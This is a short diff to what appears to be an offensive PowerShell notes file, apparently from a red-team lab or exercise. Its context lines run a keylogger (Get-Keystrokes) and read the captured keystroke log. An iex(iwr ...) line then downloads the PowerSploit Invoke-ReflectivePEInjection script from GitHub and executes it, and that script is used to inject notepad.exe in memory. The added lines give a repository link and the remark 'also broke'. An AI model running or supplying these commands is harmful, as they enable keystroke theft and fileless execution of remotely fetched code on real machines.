@@ -8,6 +8,8 @@ Get-Keystrokes
 cat $env:temp\key.log
 
 iex( iwr https://raw.githubusercontent.com/clr2of8/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1 -usebasicparsing)
+https://github.com/PowerShellMafia/PowerSploit/blob/c722f89a29fe81b2e554de3b03101794e4ad6aaa/CodeExecution/Invoke-ReflectivePEInjection.ps1
+* also broke
 $PEBytes = Get-Content C:\Windows\System32\notepad.exe -Encoding Byte -Raw
 Invoke-ReflectivePEInjection -PEBytes $PEBytes -FuncReturnType WString
 
